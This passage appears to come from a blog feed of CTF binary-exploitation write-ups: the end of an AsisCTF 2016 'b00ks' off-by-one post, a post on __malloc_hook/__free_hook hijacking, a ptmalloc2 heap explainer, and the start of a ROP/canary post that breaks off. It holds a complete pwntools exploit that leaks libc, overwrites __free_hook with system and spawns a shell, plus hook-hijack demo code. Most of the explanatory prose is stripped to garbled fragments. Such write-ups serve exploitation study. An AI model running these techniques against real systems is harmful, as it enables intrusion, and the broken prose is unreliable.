67%;"><p>0x7f3100400000-0x7f31003bc010&#x3D;0x43FF0</p><p>aslrlibc2.352.23bins</p><blockquote><p>&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space </p><ul><li>0 &#x3D; </li><li>1 &#x3D; mmap()  VDSO </li><li>2 &#x3D; 1heap</li><li>ASLR  PIE  ASLR PIE </li></ul></blockquote><p>vmmapmalloc book2book10x300x20+chunk_head(0x10)</p><p>book1payload&#x3D;p64(1) + p64(book_two_ad + 8)+p64(book_two_ad+16)+ p64(140)</p><p><img src="/2023/03/02/AsisCTF2016b00ks-OBO/image-20230302022645243.png" alt="image-20230302022645243"></p><p>free</p><p><img src="/2023/03/02/AsisCTF2016b00ks-OBO/image-20230302141959390.png" alt="image-20230302141959390"></p><p>shell2.35libchookfreehook</p><p>libc2.23shell</p><p><img src="/2023/03/02/AsisCTF2016b00ks-OBO/image-20230302152118170.png" alt="image-20230302152118170"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./b00ks&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0xE15)&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_book</span>(<span class="params">name_size, book_name, desc_size, book_desc</span>):</span><br><span class="line">    io.recv()</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Enter book name size: &#x27;</span>, <span class="built_in">str</span>(name_size).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Enter book name (Max 32 chars): &#x27;</span>, book_name)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Enter book description size: &#x27;</span>, <span class="built_in">str</span>(desc_size).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Enter book description: &#x27;</span>, book_desc)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_book</span>(<span class="params">book_id</span>):</span><br><span class="line">    io.recv()</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Enter the book id you want to delete: &#x27;</span>, <span class="built_in">str</span>(book_id).encode())</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_book</span>(<span class="params">book_id, book_desc</span>):</span><br><span class="line">    io.recv()</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Enter the book id you want to edit: &#x27;</span>, <span class="built_in">str</span>(book_id).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Enter new book description: &#x27;</span>, book_desc)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_book</span>():</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_author_name</span>(<span class="params">name</span>):</span><br><span class="line">    io.recv()</span><br><span class="line">    io.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Enter author name:&#x27;</span>, name)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">input_author_name</span>(<span class="params">name</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Enter author name: &#x27;</span>, name)</span><br><span class="line">input_author_name(<span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">create_book(<span class="number">32</span>+<span class="number">0x20</span>+<span class="number">0x90</span>,<span class="string">&#x27;one&#x27;</span>,<span class="number">140</span>,<span class="string">&#x27;onedes&#x27;</span>)</span><br><span class="line">print_book()</span><br><span class="line">ru(<span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">book_one_ad=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;book_one_ad&#x27;</span>,book_one_ad)</span><br><span class="line">create_book(<span class="number">0x21000</span>, <span class="string">&quot;two&quot;</span>, <span class="number">0x21000</span>, <span class="string">&quot;twodes&quot;</span>)</span><br><span class="line">book_two_ad=book_one_ad+<span class="number">0x30</span></span><br><span class="line">payload=p64(<span class="number">1</span>) + p64(book_two_ad + <span class="number">8</span>)+p64(book_two_ad+<span class="number">16</span>)+ p64(<span class="number">140</span>)</span><br><span class="line">edit_book(<span class="number">1</span>,payload)</span><br><span class="line">change_author_name(<span class="string">b&#x27;b&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">print_book()</span><br><span class="line">ru(<span class="string">b&#x27;Description: &#x27;</span>)</span><br><span class="line">vmmap_ad=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;vmmap_ad&#x27;</span>,vmmap_ad)</span><br><span class="line">base=vmmap_ad-<span class="number">0x58F010</span></span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line">system_ad=libc.symbols[<span class="string">&#x27;system&#x27;</span>]+base</span><br><span class="line">free_hook_ad=libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]+base</span><br><span class="line">bin_ad=<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))+base</span><br><span class="line">p(<span class="string">&#x27;bin_ad&#x27;</span>,bin_ad)</span><br><span class="line">edit_book(<span class="number">1</span>,p64(free_hook_ad))</span><br><span class="line">edit_book(<span class="number">2</span>,p64(system_ad))</span><br><span class="line">edit_book(<span class="number">1</span>,p64(bin_ad))</span><br><span class="line">delete_book(<span class="number">2</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Off By One </tag>
            
            <tag> Free Hook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>malloc_hook&amp;&amp;free_hook hijack</title>
      <link href="/2023/03/01/malloc-hook&amp;free-hook/"/>
      <url>/2023/03/01/malloc-hook&amp;free-hook/</url>
      
        <content type="html"><![CDATA[<h1 id="malloc-hook-free-hook-hijack"><a href="#malloc-hook-free-hook-hijack" class="headerlink" title="__malloc_hook__free_hook hijack"></a>__malloc_hook__free_hook hijack</h1><p>HookAPI</p><p>Ubuntu22kali__free_hook,__malloc_hook,__realloc_hook,<em>_memalign_hook,</em>_after_morecore_hookglibc-2.34patchUbuntu16 libc2.23lddefinitionlibchook</p><span id="more"></span><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16:/usr/include$ ldd --version</span><br><span class="line">ldd (Ubuntu GLIBC 2.23-0ubuntu11.3) 2.23</span><br><span class="line">Copyright (C) 2016 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.  There is NO</span><br><span class="line">warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span><br><span class="line">Written by Roland McGrath and Ulrich Drepper.</span><br></pre></td></tr></table></figure><h2 id="malloc-free"><a href="#malloc-free" class="headerlink" title="malloc free"></a>malloc free</h2><p>mallocfree</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">void</span> *x=<span class="built_in">malloc</span>(<span class="number">8</span>); </span><br><span class="line">  <span class="built_in">free</span>(x);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3><p><img src="/2023/03/01/malloc-hook&free-hook/image-20230301205645710.png" alt="image-20230301205645710"></p><p>__malloc_hookmain_arenamalloc__malloc_hooktest00mallocrip6</p><p><img src="/2023/03/01/malloc-hook&free-hook/image-20230301210214619.png" alt="image-20230301210214619"></p><p>00get_free_listfastbinsfree chunk glibc 2.26tcache</p><p> <img src="/2023/03/01/malloc-hook&free-hook/image-20230301210558248.png" alt="image-20230301210558248"></p><p>jmpmalloc_hookrdihooksystemmallocbinshgetshell</p><h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3><p><img src="/2023/03/01/malloc-hook&free-hook/image-20230301211127857.png" alt="image-20230301211127857"></p><p><img src="/2023/03/01/malloc-hook&free-hook/image-20230301211206232.png" alt="image-20230301211206232"></p><p><img src="/2023/03/01/malloc-hook&free-hook/image-20230301211304185.png" alt="image-20230301211304185"></p><p>free hookcallpc</p><h2 id="malloc-hook"><a href="#malloc-hook" class="headerlink" title="malloc hook"></a>malloc hook</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __malloc_hook =system;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">10</span>]=<span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">    <span class="type">char</span> *s = <span class="built_in">malloc</span>(str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -g -o malloc_hook malloc_hook.c </span></span><br></pre></td></tr></table></figure><p><img src="/2023/03/01/malloc-hook&free-hook/image-20230301212355513.png" alt="image-20230301212355513"></p><p><img src="/2023/03/01/malloc-hook&free-hook/image-20230301212937121.png" alt="image-20230301212937121"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:000000000041F220                               malloc_hook_ini proc near               ; CODE XREF: calloc+2C8p</span><br><span class="line">.text:000000000041F220                                                                       ; DATA XREF: .data:__malloc_hooko</span><br><span class="line">.text:000000000041F220                               ; __unwind &#123;</span><br><span class="line">.text:000000000041F220 55                            push    rbp</span><br><span class="line">.text:000000000041F221 53                            push    rbx</span><br><span class="line">.text:000000000041F222 48 89 FD                      mov     rbp, rdi</span><br><span class="line">.text:000000000041F225 48 83 EC 08                   sub     rsp, 8</span><br><span class="line">.text:000000000041F229 8B 05 35 B5 2A 00             mov     eax, cs:__libc_malloc_initialized</span><br><span class="line">.text:000000000041F22F 48 C7 05 4E B5 2A 00 00 00 00+mov     cs:__malloc_hook, 0</span><br><span class="line">.text:000000000041F22F 00</span><br><span class="line">.text:000000000041F23A 85 C0                         test    eax, eax</span><br></pre></td></tr></table></figure><p>malloc_hook0malloc_hook_inimov cs:__malloc_hook, 0 0</p><p><img src="/2023/03/01/malloc-hook&free-hook/image-20230301213351476.png" alt="image-20230301213351476"></p><p><img src="/2023/03/01/malloc-hook&free-hook/image-20230301213534133.png" alt="image-20230301213534133"></p><h2 id="free-hook"><a href="#free-hook" class="headerlink" title="free hook"></a>free hook</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *str = <span class="built_in">malloc</span>(<span class="number">160</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(str,<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;__free_hook: 0x%016X\n&quot;</span>,__free_hook);</span><br><span class="line">    __free_hook = system;</span><br><span class="line">    <span class="built_in">free</span>(str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -g -o free_hook free_hook.c </span></span><br></pre></td></tr></table></figure><p><img src="/2023/03/01/malloc-hook&free-hook/image-20230301213905560.png" alt="image-20230301213905560"></p><p><img src="/2023/03/01/malloc-hook&free-hook/image-20230301214108772.png" alt="image-20230301214108772"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Malloc Hook </tag>
            
            <tag> Free Hook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>:Ptmalloc2 (HEAP MANAGER)</title>
      <link href="/2023/02/25/23-2-25-heap/"/>
      <url>/2023/02/25/23-2-25-heap/</url>
      
        <content type="html"><![CDATA[<h1 id="HEAP-MANGER"><a href="#HEAP-MANGER" class="headerlink" title="HEAP MANGER"></a>HEAP MANGER</h1><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>()context12Linuxglibcptmalloc2</p><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line"> --&gt;  --&gt; </span><br><span class="line"> --&gt; arena  --&gt;</span><br></pre></td></tr></table></figure><span id="more"></span><p><img src="/2023/02/25/23-2-25-heap/image-20230817101448007.png" alt="image-20230817101448007"></p><h2 id="ptmalloc2"><a href="#ptmalloc2" class="headerlink" title="ptmalloc2"></a>ptmalloc2</h2><p><strong>arena</strong> malloc main arena&#x3D;&#x3D;(s)brk&#x3D;&#x3D;alsr(.data&#x2F;.bss) arena  &#x3D;&#x3D;mmap&#x3D;&#x3D; Memory-mapped segmentglic</p><p><strong>malloc_state</strong><strong>main arena</strong> <strong></strong> <strong>malloc_state</strong> <strong></strong> <strong>heap segment</strong> <strong></strong> <strong>libc.so</strong> <strong></strong> arena bins main arena  malloc state  glibc  arena  malloc_state  arena </p><p><strong>bin</strong> </p><p><strong>chunks</strong> mallocarena</p><h2 id="chunks"><a href="#chunks" class="headerlink" title="chunks"></a>chunks</h2><p>top chunk arenainuse  1chunk</p><p>malloc_chunk chunk</p><p>free chunk malloced chunk</p><p><code>allocated chunk</code></p><p>last remainder chunk mallocchunk</p><img src="/2023/02/25/23-2-25-heap/image-20230225112707364.png" alt="image-20230225112707364" style="zoom:67%;"><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line">    <span class="comment">/*above chunkhead*/</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, <span class="keyword">if</span> <span class="title function_">unallocated</span> <span class="params">(P clear)</span>  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of chunk, in bytes                     |A|M|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             User data starts here...                          .</span><br><span class="line">        .                                                               .</span><br><span class="line">        .             <span class="params">(malloc_usable_size() bytes)</span>                      .</span><br><span class="line">next    .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             <span class="params">(size of chunk, but used <span class="keyword">for</span> application data)</span>    |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|1|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><ul><li><p>prev_size</p><ul><li><blockquote><p> chunk <strong> chunkchunk </strong>chunk  (chunk)chunk <strong> chunk  chunk</strong> chunkmallocedchunk64malloc(0x10)0x20chunk_headfreemalloc(0x18)chunkchunkpre_sizemalloc(0x10)chunk<strong> chunk </strong></p></blockquote></li></ul></li><li><p>size</p><ul><li><blockquote><p>chunkchunk_head2 * SIZE_SZ()320x8640x108bit0</p><ul><li>NON_MAIN_ARENA chunk 1 0  &#x3D;&#x3D;A&#x3D;&#x3D;</li><li>IS_MAPPED chunk  mmap  free_chunk0 &#x3D;&#x3D;M&#x3D;&#x3D;</li><li>PREV_INUSE chunk  size  P  1 chunk  size  P  0  prev_size  chunk  chunk &#x3D;&#x3D;P&#x3D;&#x3D;</li></ul></blockquote></li></ul></li><li><p>fd bk</p><blockquote><p>allocatedmallocfree</p><p>fd  chunk</p><p>bk  chunk</p><p><code>fd</code><code>bk</code><code>forward</code><code>backward</code></p></blockquote></li><li><p>fd_nextsize bk_nextsize</p><ul><li><blockquote><p>freelarge chunk</p><p>fd_nextsize  chunk  bin </p><p>bk_nextsize  chunk  bin </p><p> large chunk  fd <strong> chunk </strong></p></blockquote></li></ul></li></ul><p><strong></strong> chunk  chunk  prev_size  size  chunk </p><h2 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h2><p> chunk bintop chunk,ptmalloc  heap  mmap  chunkptmalloc  chunk &#x3D;&#x3D;mmap bin&#x3D;&#x3D;</p><p>ptmalloc2bins</p><p> chunk  chunk  4 fast bins()small bins()large binsunsorted bin</p><ol><li> unsorted bin chunk  chunk </li><li> 2  63  bin  small bin small bin  chunk  small bin  chunk  <strong>2 </strong> 32  8 64  16 </li><li>small bins  bin  large binslarge bins  bin  chunk chunk  fd  chunk </li></ol><h3 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h3><p>malloc state  fastbinsY[]</p><table><thead><tr><th>fastbinsY[]</th><th>x86size_t&#x3D;4</th><th>x64size_t&#x3D;8</th></tr></thead><tbody><tr><td>0</td><td>0x10</td><td>0x20</td></tr><tr><td>1</td><td>0x18</td><td>0x30</td></tr><tr><td>2</td><td>0x20</td><td>0x40</td></tr><tr><td>3</td><td>0x28</td><td>0x50</td></tr><tr><td>4</td><td>0x30</td><td>0x60</td></tr><tr><td>5</td><td>0x38</td><td>0x70</td></tr><tr><td>6</td><td>0x40</td><td>0x80</td></tr></tbody></table><ol><li>ptmalloc2  chunk <strong></strong> fast bins ,fast bins P1chunk</li><li>fd</li><li>chunk&lt;&#x3D;MAX_FAST_SIZEfastbinsLIFOchunk</li><li>ptmalloc  set_max_fast(s)  global_max_fast  DEFAULT_MXFAST fast bins  chunk  MAX_FAST_SIZE  0  fastbin </li><li><img src="/2023/02/25/23-2-25-heap/image-20230225144619435.png" alt="image-20230225144619435" style="zoom:50%;"></li></ol><h3 id="unsortedbin"><a href="#unsortedbin" class="headerlink" title="unsortedbin"></a>unsortedbin</h3><ol><li> chunk  bin chunkbin[1]</li><li>FIFO<code>free()</code><code>FASTBIN_MAX_SIZE</code><code>fastbin</code><code>FASTBIN_MAX_SIZE</code><code>unsorted bin</code> chunk</li><li>malloc<code>fastbin</code><code>FASTBIN_MAX_SIZE</code><code>unsorted bin</code><code>unsorted bin</code><code>unsorted bin</code><code>large bin</code><code>small bin</code><code>large bin</code><code>mmapped</code></li><li><img src="/2023/02/25/23-2-25-heap/image-20230225150843293.png" alt="image-20230225150843293" style="zoom:50%;"></li></ol><h3 id="smallbin"><a href="#smallbin" class="headerlink" title="smallbin"></a>smallbin</h3><p>size&#x3D; 2* size_sz * index</p><table><thead><tr><th align="left"></th><th align="left">SIZE_SZ&#x3D;432 </th><th align="left">SIZE_SZ&#x3D;864 </th></tr></thead><tbody><tr><td align="left">2</td><td align="left">16</td><td align="left">32</td></tr><tr><td align="left">3</td><td align="left">24</td><td align="left">48</td></tr><tr><td align="left">4</td><td align="left">32</td><td align="left">64</td></tr><tr><td align="left">5</td><td align="left">40</td><td align="left">80</td></tr><tr><td align="left">x</td><td align="left">2*4*x</td><td align="left">2*8*x</td></tr><tr><td align="left">63</td><td align="left">504</td><td align="left">1008</td></tr></tbody></table><ol><li> chunk </li><li></li><li><strong>small bins  bin  FIFO </strong></li><li>free unsortedbin</li><li><img src="/2023/02/25/23-2-25-heap/image-20230225151846846.png" alt="image-20230225151846846" style="zoom:50%;"></li></ol><h3 id="large-Bin"><a href="#large-Bin" class="headerlink" title="large Bin"></a>large Bin</h3><ol><li><p>bins[64] ~ bins[126] </p></li><li><p> FIFO</p></li><li><p> 63  bin  6  bin  chunk </p><table><thead><tr><th align="left"></th><th align="left"></th><th align="left"></th></tr></thead><tbody><tr><td align="left">1</td><td align="left">32</td><td align="left">64B</td></tr><tr><td align="left">2</td><td align="left">16</td><td align="left">512B</td></tr><tr><td align="left">3</td><td align="left">8</td><td align="left">4096B</td></tr><tr><td align="left">4</td><td align="left">4</td><td align="left">32768B</td></tr><tr><td align="left">5</td><td align="left">2</td><td align="left">262144B</td></tr><tr><td align="left">6</td><td align="left">1</td><td align="left"></td></tr></tbody></table></li><li><img src="/2023/02/25/23-2-25-heap/image-20230225152540343.png" alt="image-20230225152540343" style="zoom: 67%;"></li></ol><h3 id="heap-info"><a href="#heap-info" class="headerlink" title="heap_info"></a>heap_info</h3><p> heap  heap </p><p> Memory Mapping Segment (mmap)</p><h3 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h3><p> arena  chunk chunk  thread arena  main arena malloc state arena</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> &#123;</span></span><br><span class="line">    <span class="comment">/* Serialize access.  */</span></span><br><span class="line">    __libc_lock_define(, mutex);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">    <span class="type">int</span> flags;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Fastbins */</span></span><br><span class="line">    mfastbinptr fastbinsY[ NFASTBINS ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">    mchunkptr top;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">    mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">    mchunkptr bins[ NBINS * <span class="number">2</span> - <span class="number">2</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Bitmap of bins, help to speed up the process of determinating if a given bin is definitely empty.*/</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> binmap[ BINMAPSIZE ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Linked list, points to the next arena */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">       by free_list_lock in arena.c.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">       the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">       free_list_lock in arena.c.  */</span></span><br><span class="line">    INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">    INTERNAL_SIZE_T system_mem;</span><br><span class="line">    INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a><a href="https://blog.csdn.net/sinat_19596835/article/details/81665095"></a></h2><p><img src="/2023/02/25/23-2-25-heap/image-20230805140153900.png" alt="image-20230805140153900"></p>]]></content>
      
      
      
        <tags>
            
            <tag> HEAP MANGER </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rop</title>
      <link href="/2023/02/16/23-2-16/"/>
      <url>/2023/02/16/23-2-16/</url>
      
        <content type="html"><![CDATA[<p></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p><a href="https://pan.baidu.com/s/1_EXQHF0uumBE2tWhloeiNg">https://pan.baidu.com/s/1_EXQHF0uumBE2tWhloeiNg</a><br>2thf</p><p>expflagexpexp</p><span id="more"></span><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p><img src="/2023/02/16/23-2-16/image-20230216230353617.png" alt="image-20230216230353617"></p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p><img src="/2023/02/16/23-2-16/image-20230216230425068.png" alt="image-20230216230425068"></p><p></p><h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><p><img src="/2023/02/16/23-2-16/image-20230216230715969.png" alt="image-20230216230715969"></p><p>buf8byte0x1e0x5awin</p><p><img src="/2023/02/16/23-2-16/image-20230216230920491.png" alt="image-20230216230920491"></p><p>flag.txtflarop</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><ol><li>canarycanarycanarylowbyte0canarypush rbpbufrbp0x12&#x3D;1810bytecanarycanarylowbyteprintf(You said: %s\n, (const char *)&amp;buf);canarypaylaodba*11,canaryrbpreadcanarygetfeedback()</li><li>piepie</li></ol><p><img src="/2023/02/16/23-2-16/image-20230216234031392.png" alt="image-20230216234031392"></p><p>ba*26elfpiecanarycanarycanary</p><p><img src="/2023/02/16/23-2-16/image-20230216235350781.png" alt="image-20230216235350781"></p><p>readreadropcanary</p><ol start="3"><li>win</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">win</span><br><span class="line">0x0000555555555249 